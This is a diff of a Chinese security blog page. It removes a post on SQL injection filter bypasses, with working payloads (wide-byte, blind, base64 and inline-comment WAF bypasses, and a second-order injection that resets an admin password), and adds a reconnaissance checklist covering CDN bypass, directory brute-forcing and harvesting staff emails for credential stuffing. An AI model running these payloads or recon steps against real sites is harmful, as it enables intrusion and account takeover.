@@ -6,22 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://kur08a.github.io">
-  <title>SQLI的绕过姿势 | Kur08a&#39;s Blog</title>
+  <title>fast info-gather | Kur08a&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="十种常用绕过姿势以及二次注入原理。">
+  <meta name="description" content="主动信息搜集：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQLI的绕过姿势">
-<meta property="og:url" content="https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:title" content="fast info-gather">
+<meta property="og:url" content="https://kur08a.github.io/2022/03/27/fast-info-gather/index.html">
 <meta property="og:site_name" content="Kur08a&#39;s Blog">
-<meta property="og:description" content="十种常用绕过姿势以及二次注入原理。">
+<meta property="og:description" content="主动信息搜集：">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-03-26T14:23:48.000Z">
-<meta property="article:modified_time" content="2022-03-27T05:25:10.960Z">
+<meta property="article:published_time" content="2022-03-27T06:49:40.000Z">
+<meta property="article:modified_time" content="2022-03-27T07:30:36.645Z">
 <meta property="article:author" content="kur08a">
 <meta property="article:tag" content="penetration">
-<meta property="article:tag" content="Web vulnerability">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Kur08a&#39;s Blog" type="application/atom+xml">
@@ -193,14 +192,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-SQLI的绕过姿势" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-fast-info-gather" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      SQLI的绕过姿势
+      fast info-gather
     </h1>
   
 
@@ -213,8 +212,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="archive-article-date">
-        <time datetime="2022-03-26T14:23:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-26</time>
+<a href="/2022/03/27/fast-info-gather/" class="archive-article-date">
+        <time datetime="2022-03-27T06:49:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-27</time>
 </a>
 
   
@@ -227,7 +226,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.2k字</span>
+      <span class="post-count">1.5k字</span>
     </span>
   </span>
 
@@ -236,7 +235,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">4分</span>
+      <span class="post-count">5分</span>
     </span>
   </span>
 </div>
@@ -247,24 +246,109 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>十种常用绕过姿势以及二次注入原理。<span id="more"></span></p>
-<h2 id="1、SQL注入的各种绕过姿势："><a href="#1、SQL注入的各种绕过姿势：" class="headerlink" title="1、SQL注入的各种绕过姿势："></a>1、SQL注入的各种绕过姿势：</h2><h3 id="①大小写绕过"><a href="#①大小写绕过" class="headerlink" title="①大小写绕过"></a>①大小写绕过</h3><h3 id="②过滤注释的绕过"><a href="#②过滤注释的绕过" class="headerlink" title="②过滤注释的绕过"></a>②过滤注释的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),&#x27;3</span><br><span class="line">?id=-1&#x27; union select 1,database(),3 or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>
-
-<h3 id="③双写绕过"><a href="#③双写绕过" class="headerlink" title="③双写绕过"></a>③双写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; aAndnD 1=1 --+</span><br><span class="line">也可在敏感词汇中添加注释，如：a/**/nd</span><br></pre></td></tr></table></figure>
-
-<h3 id="④关键字等价绕过"><a href="#④关键字等价绕过" class="headerlink" title="④关键字等价绕过"></a>④关键字等价绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了and和or，可用&amp;&amp;和||替代。</span><br></pre></td></tr></table></figure>
-
-<h3 id="⑤过滤空格或单引号的绕过"><a href="#⑤过滤空格或单引号的绕过" class="headerlink" title="⑤过滤空格或单引号的绕过"></a>⑤过滤空格或单引号的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1、可替代空格使用的符号：</span><br><span class="line">%20  %09  %0a  %0b %0c %0d %a0 /**/     （首选%a0）</span><br><span class="line">%a0 #表示空格，MySQL 中%a0 代表空白符，可以代替空格。</span><br><span class="line"></span><br><span class="line">%26 #表示&amp;</span><br><span class="line">%27 #表示 &#x27; 单引号</span><br><span class="line"></span><br><span class="line">2、过滤单引号，使用编码行不通怎么办？</span><br><span class="line">使用\&#x27; or 1=1#</span><br><span class="line">\注释掉单引号， or 1=1可以换成构造的SQL语句，如union select。#注释掉后面的内容。</span><br><span class="line">例如：</span><br><span class="line">$sql = &quot;SELECT username, password FROM user WHERE username=&#x27;&quot; .$user .&quot;&#x27; &amp;&amp; password=&#x27;&quot; .$pass .&quot;&#x27;&quot;;</span><br><span class="line">要想闭合sql语句加上or 1=1#来使判断条件为真，使用\转义，用\转义后面的单引号。</span><br><span class="line">在用户名框输入\，密码框输入or 1=1 #，这样提交后，sql语句是这样的：</span><br><span class="line">...where username=&#x27;\&#x27;&amp;&amp; password=&#x27; or 1=1 #&#x27;</span><br><span class="line">这时实际上你提交的username就是\&#x27;&amp;&amp; password= </span><br><span class="line">提交的密码里的#把后面的多余的单引号给注释掉了，这个时候sql注入就成功了。</span><br></pre></td></tr></table></figure>
-
-<h3 id="⑥过滤关键字的绕过"><a href="#⑥过滤关键字的绕过" class="headerlink" title="⑥过滤关键字的绕过"></a>⑥过滤关键字的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 大小写绕过</span><br><span class="line">b. 盲注绕过</span><br><span class="line">?id=1%27%a0and%a0if((length(database())=8),sleep(3),1)%a0and%a0%271</span><br></pre></td></tr></table></figure>
-
-<h3 id="⑦宽字节（宽字符）绕过（addslashes-转义的-sql-注入）"><a href="#⑦宽字节（宽字符）绕过（addslashes-转义的-sql-注入）" class="headerlink" title="⑦宽字节（宽字符）绕过（addslashes()转义的 sql 注入）"></a>⑦宽字节（宽字符）绕过（addslashes()转义的 sql 注入）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">为了防止注入，开启了gpc。但数据库设置GBK(宽字节字符集)，就会产生漏洞。</span><br><span class="line">原理是GBK可以逃逸gpc，比如数据库编码与php编码不通</span><br><span class="line"></span><br><span class="line">?id=-1%df&#x27; union select 1,database(),user()--+</span><br><span class="line"></span><br><span class="line">【宽字符注入的必要条件，第一个字符的 ASCII 码必须大于 128。</span><br><span class="line">不一定要用%df，使用ASCII码（十进制）大于128的即可，如：</span><br><span class="line">129（十进制）转换为十六进制为0x81，在十六进制前加%即可。</span><br><span class="line">这取决于GBK字符集，ASCII码128以前(1-127)是常规字符，128以后是特殊字符。</span><br><span class="line">GBK首字节对应0x81-oxFE，尾字节对应0x40-0xFE（除0x7F）。】</span><br><span class="line">原理：</span><br><span class="line">&#x27; 或 \ 被 PHP 转义，单引号被加上反斜杠\，变成了\&#x27;</span><br><span class="line">\ 的十六进制是 %5C </span><br><span class="line">在注入时候可以加入%df，然后结果为%df\&#x27; </span><br><span class="line">换为 URL 编码则是 %df%5c%27</span><br><span class="line">如果程序的默认字符集是 GBK 等宽字节字符集，</span><br><span class="line">则 MySQL 用 GBK 的编码时，会认为 %df%5c 是一个宽字符，也就是運&#x27;，</span><br><span class="line">也就是说：%df\&#x27; = %df%5c%27= 運&#x27;，接下来单引号就可以起闭合作用了。</span><br></pre></td></tr></table></figure>
-
-<h3 id="⑧Base64绕过（cookie注入等POST方式）"><a href="#⑧Base64绕过（cookie注入等POST方式）" class="headerlink" title="⑧Base64绕过（cookie注入等POST方式）"></a>⑧Base64绕过（cookie注入等POST方式）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编码后进行注入，这样gpc拦截不了，注入后，再执行程序解码拼接恶意语句注入查询。</span><br><span class="line"></span><br><span class="line">将我们设计好的 SQL 语句进行 base64 加密：</span><br><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br><span class="line">变成了：</span><br><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure>
-
-<h3 id="⑨URL编码绕过"><a href="#⑨URL编码绕过" class="headerlink" title="⑨URL编码绕过"></a>⑨URL编码绕过</h3><h3 id="⑩内联注释绕过WAF（只有MySQL可以识别，SQL-server不能）"><a href="#⑩内联注释绕过WAF（只有MySQL可以识别，SQL-server不能）" class="headerlink" title="⑩内联注释绕过WAF（只有MySQL可以识别，SQL server不能）"></a>⑩内联注释绕过WAF（只有MySQL可以识别，SQL server不能）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*//*!select*/</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-、实现二次注入修改其他用户密码："><a href="#2-、实现二次注入修改其他用户密码：" class="headerlink" title="2 、实现二次注入修改其他用户密码："></a>2 、实现二次注入修改其他用户密码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">二次注入：</span><br><span class="line">二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</span><br><span class="line">二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。</span><br><span class="line">普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</span><br><span class="line">原理</span><br><span class="line">在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes </span><br><span class="line">或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义（添加了/），</span><br><span class="line">但是 / 并不会插入数据库，所以在存入数据库时还是原来的数据，</span><br><span class="line">数据中一般带有单引号和＃号，然后下次被读取后拼凑在了新的SQL查询语句中，所以就形成了二次注入。</span><br><span class="line">如下：</span><br><span class="line"></span><br><span class="line">1、新建用户 admin&#x27;-- +</span><br><span class="line">(用户名是我们设计的 payload)</span><br><span class="line">(我用admin&#x27;--+失败了？？？空格不能少)</span><br><span class="line"></span><br><span class="line">2、登录新用户重设密码</span><br><span class="line"></span><br><span class="line">3、修改成功，其实修改的是admin用户的密码。</span><br><span class="line">源码分析：</span><br><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and </span><br><span class="line">password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">我们将用户信息带入</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;123qwe&#x27; where username=&#x27;admin&#x27;-- +&#x27; and </span><br><span class="line">password=&#x27;123456&#x27;；</span><br><span class="line">最终执行</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;123qwe&#x27; where username=&#x27; admin&#x27;;</span><br><span class="line"></span><br><span class="line">总结：二次注入构建了一个能够被重复利用的 payload。</span><br></pre></td></tr></table></figure>
+    <p><strong>主动信息搜集：</strong> <span id="more"></span></p>
+<p>与目标主机进行直接交互，通过对交互过程中的信息进行收集，优点是能够实时的得到最新的信息，缺点是会记录自己的所有操作信息。比如nmap端口扫描，scapy高级扫描，Burpsuite站点地图收集等。</p>
+<p><strong>被动信息搜集：</strong></p>
+<p>不与目标主机进行直接交互，通过搜索引擎(与服务器进行交互而非目标主机)或者社会工程等方式间接的获取目标主机的信息。比如：Google搜索，Shadan搜索，fofa搜索，钟馗之眼等。</p>
+<h2 id="一、whois信息"><a href="#一、whois信息" class="headerlink" title="一、whois信息"></a>一、whois信息</h2><p>注册商、注册人、邮件、DNS解析服务器、注册人联系电话、企业备案信息【限于国内，国外无需备案】等。</p>
+<p>①<a target="_blank" rel="noopener" href="https://whois.aizhan.com/">爱站</a> </p>
+<p>②<a target="_blank" rel="noopener" href="https://whois365.com/cn">全球whois查询(可看自己的IP)</a> </p>
+<h2 id="二、子域名"><a href="#二、子域名" class="headerlink" title="二、子域名"></a>二、子域名</h2><p>①Layer子域名挖掘机。</p>
+<p>②<a target="_blank" rel="noopener" href="https://www.virustotal.com/">virustotal</a> 首选（子域名和IP都出来了）</p>
+<p>③<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a> (很全面,需配置好)</p>
+<h2 id="三、IP段的收集"><a href="#三、IP段的收集" class="headerlink" title="三、IP段的收集"></a>三、IP段的收集</h2><p>通过whois和子域名查询就可以基本得到IP段了。</p>
+<h2 id="四、查找真实IP-非CDN的IP"><a href="#四、查找真实IP-非CDN的IP" class="headerlink" title="四、查找真实IP(非CDN的IP)"></a>四、查找真实IP(非CDN的IP)</h2><p>①ping、nslookup（常规，没有绕过CDN）</p>
+<p>②DNS历史解析记录：</p>
+<p><a target="_blank" rel="noopener" href="https://viewdns.info/iphistory/">iphistory（好用）</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://site.ip138.com/">域名查询</a> </p>
+<p>③查找子域名(有时主站做了CDN而C段子域名未加入CDN)</p>
+<p>④网站邮件头信息</p>
+<p>(比如说，邮箱注册，邮箱找回密码、RSS 邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的 IP，查看邮件头信息，获取到网站的真实 IP。)</p>
+<p>⑤网络空间安全引擎搜索(钟馗之眼、fofa)</p>
+<p>⑥利用 SSL 证书寻找真实 IP(SSL&#x2F;TLS 证书通常包含域名、子域名和电子邮件地址)</p>
+<p><a target="_blank" rel="noopener" href="https://crt.sh/">crt.sh</a></p>
+<p><a target="_blank" rel="noopener" href="https://censys.io/">censys.io</a></p>
+<p>⑦国外主机解析域名</p>
+<p>(大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的 DNS 查询，很可能获取到真实 IP。)</p>
+<p><a target="_blank" rel="noopener" href="http://host-tracker.com/">host-tracker</a></p>
+<p>⑧扫描全网</p>
+<p>(通过 Zmap、masscan 等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实 IP)<br>Zmap(下载)和masscan(自带)在kali都有了。</p>
+<p>⑨配置不当导致可绕过CDN。</p>
+<p>案例 1：为了方便用户访问，我们常常将 <a target="_blank" rel="noopener" href="http://www.test.com/">www.test.com</a> 和 test.com 解析到同一个站点，而CDN 只配置了 <a target="_blank" rel="noopener" href="http://www.test.com,通过访问/">www.test.com，通过访问</a> test.com，就可以绕过 CDN 了。(百度就是)</p>
+<p>案例 2：站点同时支持 http 和 https 访问，CDN 只配置 https 协议，那么这时访问 http 就可以轻易绕过。</p>
+<h2 id="五、端口扫描"><a href="#五、端口扫描" class="headerlink" title="五、端口扫描"></a>五、端口扫描</h2><p>21 &gt;&gt; FTP</p>
+<p>22 &gt;&gt; SSH</p>
+<p>23 &gt;&gt; Telnet</p>
+<p>53 &gt;&gt; DNS</p>
+<p>80 &gt;&gt; HTTP</p>
+<p>110 &gt;&gt; POP3</p>
+<p>443 &gt;&gt; HTTPS</p>
+<p>445 &gt;&gt; SMB (ServerMessage Block) 通信协议</p>
+<p>1080 &gt;&gt; socket</p>
+<p>1433 &gt;&gt; mssql（默认安装时留下的空口令SA用户，可以让攻 击者为所欲为）</p>
+<p>3306 &gt;&gt; Mysql</p>
+<p>… …</p>
+<p>3389 &gt;&gt;Windows远程连接&#x2F;RDP</p>
+<p>6379 &gt;&gt;redis（Remote Dictionary Server )，即远程字典服务</p>
+<p>8080 &gt;&gt;Tomcat&#x2F;Jboss</p>
+<p>9090 &gt;&gt;WebSphere 等</p>
+<p>常用工具：</p>
+<p>nmap    (kali自带)</p>
+<p>nbtscan  (kali自带)</p>
+<p>telnet    kali自带 远程登录（q 退出）</p>
+<p>portscan ？</p>
+<h2 id="六、网站架构探测"><a href="#六、网站架构探测" class="headerlink" title="六、网站架构探测"></a>六、网站架构探测</h2><p>探测目标站点的网站架构，比如：操作系统，中间件，脚本语言，数据库，服务器，web容器等等。</p>
+<p>服务器类型：服务器平台、版本等</p>
+<p>网站容器：   搭建网站的服务组件，例如: iis、Apache、nginx、tomcat 等</p>
+<p>脚本类型：   ASP、PHP、JSP、aspx 等</p>
+<p>数据库类型：access、sqlserver、mysql、oracle、postgresql 等</p>
+<p>①CMS 指纹识别(whatweb【kali有,也有在线网站】、Webrobot 工具)</p>
+<p>②谷歌 hacker（Google搜索语法）</p>
+<p>③Firefox插件Wappalyzer</p>
+<h2 id="七、敏感文件、敏感目录探测"><a href="#七、敏感文件、敏感目录探测" class="headerlink" title="七、敏感文件、敏感目录探测"></a>七、敏感文件、敏感目录探测</h2><p>通常我们所说的<strong>敏感文件、敏感目录</strong>大概有以下几种：</p>
+<ul>
+<li>Git</li>
+<li>hg&#x2F;Mercurial</li>
+<li>svn&#x2F;Subversion</li>
+<li>bzr&#x2F;Bazaar</li>
+<li>Cvs</li>
+<li>WEB-INF 泄露</li>
+<li>备份文件泄露、配置文件泄露</li>
+</ul>
+<p>敏感文件、敏感目录挖掘一般都是靠工具、脚本来找</p>
+<p><strong>收集方向：</strong></p>
+<p>robots.txt、后台目录、安装包、上传目录、mysql 管理接口、安装页面、phpinfo、编辑器</p>
+<p><strong>常用工具：</strong></p>
+<p>字典爆破 &gt;&gt; 御剑、dirbuster(kali自带)、dirb(kali自带，好用)、wwwscan、<br>IIS_shortname_Scanner等</p>
+<p>蜘蛛爬行 &gt;&gt; 爬行菜刀、webrobot，burpsuite 等</p>
+<p><strong>后台查找：</strong></p>
+<ol>
+<li>弱口令默认后台：admin，admin&#x2F;login.asp，manage，login.asp 等等常见后台</li>
+<li>查看网页的链接：一般来说，网站的主页有管理登陆类似的东西，有些可能被管理员删掉</li>
+<li>查看网站图片的属性</li>
+<li>查看网站使用的管理系统，从而确定后台</li>
+<li>用工具查找：wwwscan，intellitamper，御剑</li>
+<li>robots.txt 的帮助：robots.txt 文件告诉蜘蛛程序在服务器上什么样的文件可以被查看</li>
+<li>GoogleHacker</li>
+<li>查看网站使用的编辑器是否有默认后台</li>
+<li>短文件利用</li>
+<li>sqlmap –sql-shell load_file(‘d:&#x2F;wwroot&#x2F;index.php’);</li>
+</ol>
+<h2 id="八、目标域名邮箱收集"><a href="#八、目标域名邮箱收集" class="headerlink" title="八、目标域名邮箱收集"></a>八、目标域名邮箱收集</h2><p>一定要养成收集站点邮箱账号的习惯（因为好多官方后台都是用内部邮箱账号登录的，指不定哪天你就得到一个进后台的机会）。</p>
+<ul>
+<li>通过说明文档以及网站页面收集，或者网站发表者以及留言板信息处收集账号</li>
+<li>通过 teemo，metago，burpusit，awvs，netspker 或者 google 语法收集</li>
+<li>搜索相关 QQ 群收集相关企业员工的社交账号 (用途：可用来进行爆破或者弱口令登录以及撞库攻击。)</li>
+</ul>
+<h2 id="九、WAF-探测"><a href="#九、WAF-探测" class="headerlink" title="九、WAF 探测"></a>九、WAF 探测</h2><p>Waf 也叫 Web 应用防火墙，是通过执行一系列针对 HTTP&#x2F;HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</p>
+<p>常用的两种方式：</p>
+<p>1）手工（提交恶意数据，简单粗暴）</p>
+<p>2）Kali 工具（WAFW00F (wafw零零f)、Nmap）</p>
+<h2 id="十、旁站、C-段"><a href="#十、旁站、C-段" class="headerlink" title="十、旁站、C 段"></a>十、旁站、C 段</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。</p>
+<p>C 段：是和目标服务器 ip 处在同一个 C 段的其它服务器。</p>
+<p><strong>常用工具：</strong></p>
+<p>web &gt;&gt; k8 旁站、御剑 1.5</p>
+<p>端口 &gt;&gt; portscan</p>
 
     
 
@@ -279,7 +363,7 @@
    
    <br>
    <strong>本文链接：</strong>
-   <a rel="license" href="https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a>
+   <a rel="license" href="https://kur08a.github.io/2022/03/27/fast-info-gather/">https://kur08a.github.io/2022/03/27/fast-info-gather/</a>
    <br>
    <strong>版权声明：</strong>
    本作品采用
@@ -339,10 +423,6 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">penetration</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Web vulnerability</a>
-        		</li>
       		
 		</ul>
 	</div>
@@ -397,7 +477,7 @@
   <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
   <p>扫一扫，分享到微信</p>
   <div class="wx-qrcode">
-    <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" alt="微信分享二维码">
+    <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kur08a.github.io/2022/03/27/fast-info-gather/" alt="微信分享二维码">
   </div>
 </div>
 
@@ -412,18 +492,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2022/03/27/fast-info-gather/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          fast info-gather
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/03/26/infomation-gathering/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">infomation gathering</div>
+    <a href="/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SQLI的绕过姿势</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -450,7 +521,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">1、SQL注入的各种绕过姿势：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">①大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">②过滤注释的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">③双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3%E5%85%B3%E9%94%AE%E5%AD%97%E7%AD%89%E4%BB%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">④关键字等价绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A4%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%88%96%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">⑤过滤空格或单引号的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A5%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">⑥过滤关键字的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A6%E5%AE%BD%E5%AD%97%E8%8A%82%EF%BC%88%E5%AE%BD%E5%AD%97%E7%AC%A6%EF%BC%89%E7%BB%95%E8%BF%87%EF%BC%88addslashes-%E8%BD%AC%E4%B9%89%E7%9A%84-sql-%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">⑦宽字节（宽字符）绕过（addslashes()转义的 sql 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A7Base64%E7%BB%95%E8%BF%87%EF%BC%88cookie%E6%B3%A8%E5%85%A5%E7%AD%89POST%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-number">1.8.</span> <span class="toc-text">⑧Base64绕过（cookie注入等POST方式）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A8URL%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">⑨URL编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A9%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87WAF%EF%BC%88%E5%8F%AA%E6%9C%89MySQL%E5%8F%AF%E4%BB%A5%E8%AF%86%E5%88%AB%EF%BC%8CSQL-server%E4%B8%8D%E8%83%BD%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">⑩内联注释绕过WAF（只有MySQL可以识别，SQL server不能）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E3%80%81%E5%AE%9E%E7%8E%B0%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E4%BF%AE%E6%94%B9%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">2 、实现二次注入修改其他用户密码：</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81whois%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">一、whois信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.</span> <span class="toc-text">二、子域名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81IP%E6%AE%B5%E7%9A%84%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">三、IP段的收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP-%E9%9D%9ECDN%E7%9A%84IP"><span class="toc-number">4.</span> <span class="toc-text">四、查找真实IP(非CDN的IP)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">5.</span> <span class="toc-text">五、端口扫描</span></a></li><li class="toc-item 